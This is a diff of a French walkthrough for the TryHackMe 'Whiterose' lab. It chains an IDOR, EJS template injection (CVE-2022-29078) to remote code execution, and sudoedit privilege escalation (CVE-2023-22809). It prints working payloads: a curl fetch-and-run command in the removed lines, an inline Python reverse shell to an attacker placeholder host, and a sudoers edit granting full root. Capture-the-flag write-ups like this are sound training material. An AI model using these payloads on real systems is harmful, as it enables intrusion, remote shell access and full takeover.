@@ -9,12 +9,31 @@ Yet another Mr. Robot themed challenge.
 Cette room permet de travailler plusieurs notions clés en pentest :
 - Énumération de services réseau
 - Exploitation d’une IDOR
-- Exploitation SSTI (EJS) → RCE
+- Exploitation SSTI (EJS) → RCE Node.js
 - Élévation de privilèges via sudoedit (CVE)
 
 
 ⚠️ Ce walkthrough est fourni à des fins éducatives uniquement.
 N’effectuez jamais ces techniques sur des systèmes sans autorisation explicite.
+
+# Résumé exécutif
+
+Ce rapport présente l’exploitation complète de la room Whiterose sur TryHackMe.  
+L’objectif est de démontrer une chaîne d’attaque réaliste, depuis une surface web exposée
+jusqu’à une compromission totale du système.
+
+Chaîne d’exploitation :  
+IDOR → compromission compte admin → SSTI EJS → RCE → élévation de privilèges Linux.
+
+Public visé : Pentester junior / Blue team / Développeur backend.
+
+# Outils utilisés
+- Nmap
+- Gobuster
+- Burp Suite
+- Netcat
+- Python
+- sudo
 
 # 1. Reconnaissance (Recon)
 
@@ -44,7 +63,7 @@ Ports ouverts :
 | Port    | Service   | Intérêt |
 |---------|-----------|---------|
 | 22      | SSH       | Accès distant (post-exploitation) |
-| 80     | HTTP   | Site web nginx 1.14.0 potiellement vulnérable |
+| 80     | HTTP   | Site web nginx 1.14.0 potentiellement vulnérable |
 
 ### Accès au site
 
@@ -86,7 +105,7 @@ Le sous-domaine admin.cyprusbank.thm expose une page de connexion.
 
 Le challenge met à notre disposition des identifiants `Olivia Cortez : olivi8` fournis que nous pouvons utiliser pour se connecter.
 
-La connexion au site est réussie, mais nous accès limité puisque l'endpoint /settings est interdit pour l'utilisateur Olivia Cortez.
+La connexion au site est réussie, mais nous avons un accès limité puisque l'endpoint /settings est interdit pour l'utilisateur Olivia Cortez.
 
 ![image](https://github.com/user-attachments/assets/9ff1c639-4c06-4f7a-a766-c5745ea205c7)
 
@@ -95,7 +114,7 @@ La connexion au site est réussie, mais nous accès limité puisque l'endpoint /
 En se rendant sur l'endpoint /messages `/messages/?c=5`, on peut observer qu'il y a un paramètre `c` dans l'url. Ce paramètre est contrôlé côté client.
 
 ### Test Insecure Direct Object Reference (IDOR)
-Essayons de changer la valeur du paramètre `c` afin de potiellement révéler des informations dont nous ne disponsons pas initialement  :  `/messages/?c=20`
+Essayons de changer la valeur du paramètre `c` afin de potiellement révéler des informations dont nous ne disposons pas initialement  :  `/messages/?c=20`
 
 ![image](https://github.com/user-attachments/assets/58700f39-3a1c-4d07-a361-1ebd86364d0f)
 
@@ -104,15 +123,21 @@ Accès à davantage de messages
 
 Cette manipulation révèle une divulgation d’identifiants sensibles : `Gayle Bev : REDACTED`
 
+**Impact sécurité :**  
+Cette vulnérabilité permet à un utilisateur authentifié d’accéder à des ressources ne lui appartenant pas,
+entraînant une fuite d’informations sensibles et facilitant la compromission de comptes à privilèges élevés.
+
 # 5. Compte administrateur & surface d’attaque élargie
 
-On peut maintenant se connecter avec le compte de Gayle Bev, ce qui permet d'avoir accès à l'endpoint /settings et donc de modifier les mots de passe des utilisateurs.
+À ce stade, nous disposons d’un accès administrateur à l’application web, ce qui élargit considérablement la surface d’attaque côté serveur.
+
+On a maintenant accès à l’endpoint /settings et il devient possible de modifier les mots de passe des utilisateurs.
 
 Les mots de passe sont réinjectés côté serveur dans la réponse HTML.  
 
 ![image](https://github.com/user-attachments/assets/8469acb1-dd86-441b-807c-0183bded15f0)
 
-➡️ Indice fort de SSTI / XSS
+➡️ Indice fort de SSTI (rendu serveur)
 
 # 6. Server-Side Template Injection (SSTI)
 
@@ -168,7 +193,7 @@ Informations critiques divulguées :
 
 # 7. Validation de la SSTI → RCE (CVE-2022-29078)
 
-De nombreuses ressources sur internes parlent de la CVE-2022-29078 permettant d'obtenir une exécution de code arbitraire à partir d'une vulnérabilité SSTI :
+De nombreuses ressources sur Internet parlent de la CVE-2022-29078 permettant d'obtenir une exécution de code arbitraire à partir d'une vulnérabilité SSTI :
 - https://github.com/mde/ejs/issues/720
 - https://eslam.io/posts/ejs-server-side-template-injection-rce/
 
@@ -177,7 +202,7 @@ Payload de test SSTI (via Burp Suite) :
 ``` text
 settings[view options][outputFunctionName]=x;
 process.mainModule.require('child_process')
-.execSync('curl <IP_ATTAQUANT>:8000');
+.execSync('whoami');
 s
 ```
 
@@ -186,41 +211,45 @@ s
 ➡️ Callback reçu  
 ✅ Exécution de commandes confirmée
 
+**Impact sécurité :**  
+La vulnérabilité SSTI permet à un attaquant authentifié d’exécuter du code arbitraire côté serveur, aboutissant à une compromission complète de l’application et du système sous-jacent.
+
 # 8. Obtention d’un reverse shell
 
+La SSTI EJS confirmée permettant l’exécution de commandes arbitraires, il est possible d’invoquer directement Python afin d’établir un reverse shell vers la machine attaquante, sans déposer de fichier sur la cible.
+
 ### Payload utilisé
-
-On peut créer un script python permettant d'obtenir un reverse shell.
-
-``` python
-import socket,os,pty
-
-s=socket.socket()
-s.connect(("<IP_ATTAQUANT>",1234))
-
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-
-pty.spawn("sh")
-```
-
-Maintenant avec la vulnérabilité d'exécution de code à distance, on peut télécharger et faire exécuter notre payload sur la machine cible.
 
 ``` text
 settings[view options][outputFunctionName]=x;
 process.mainModule.require('child_process')
-.execSync('curl <IP_ATTAQUANT>:8000/script.py | bash');
-s
+.execSync(
+"python3 -c 'import socket,os,pty;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((\"IP_ATTAQUANT\", 1234));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn(\"sh\")'"
+);
 ```
+Le reverse shell est exécuté directement via Python,
+sans téléchargement ni écriture de fichier sur la machine cible, afin de réduire les traces laissées sur le système.
+
+Ce payload ouvre une connexion TCP vers la machine attaquante, redirige les entrées/sorties standard vers le socket, puis ouvre un shell interactif via `pty`, assurant une session stable.
 
 ➡️ Shell obtenu 
 
 ![image](https://github.com/user-attachments/assets/e862b1c2-9371-43c6-8add-33cc70ba0e8d)
+
  
 ➡️ Stabilisation du shell 
 
 ![image](https://github.com/user-attachments/assets/ef5be721-2c95-4cc9-89c3-b5b04de621e9)
+
+**Impact sécurité :**  
+L’exécution de commandes arbitraires permet à un attaquant d’obtenir un accès interactif au système,
+ouvrant la voie au vol de données, à l’installation de portes dérobées et à une élévation de privilèges.
 
 # 9. Accès utilisateur & flag user
 
@@ -233,7 +262,7 @@ Flag trouvé dans le répertoire `/home/web/user.txt`
 # 10. Élévation de privilèges – sudoedit (CVE-2023-22809)
 
 ### Analyse sudo
-La commande `sudo -l` liste tout ce ce que l’utilisateur web peut exécuter avec sudo. 
+La commande `sudo -l` liste tout ce que l’utilisateur web peut exécuter avec sudo. 
 
 ![image](https://github.com/user-attachments/assets/549edde0-3acd-4571-ae35-6f200a31c15f)
 
@@ -256,7 +285,7 @@ Pour utiliser cette vulnérabilité à des fins d'élévation de privilèges, no
 
 Plus d'informations détaillées à ce sujet dans cet avis de sécurité publié par Synacktiv (https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)
 
-### Exploit
+### Exploitation
 
 ``` bash
 export EDITOR="nano -- /etc/sudoers"
@@ -268,6 +297,9 @@ Le fichier `/etc/sudoers` s'ouvre avec nano.
 En ajoutant `web ALL=(ALL) NOPASSWD: ALL` au fichier, nous pouvons accorder à notre utilisateur actuel tous les privilèges sudo.
 
 ![image](https://github.com/user-attachments/assets/36834f4c-cb6c-482a-ab68-5c0862ba3af7)
+
+**Impact sécurité :**  
+La mauvaise configuration de sudo, combinée à une version vulnérable, permet une élévation de privilèges locale menant à un accès root complet sur la machine.
 
 # 12. Accès root
 
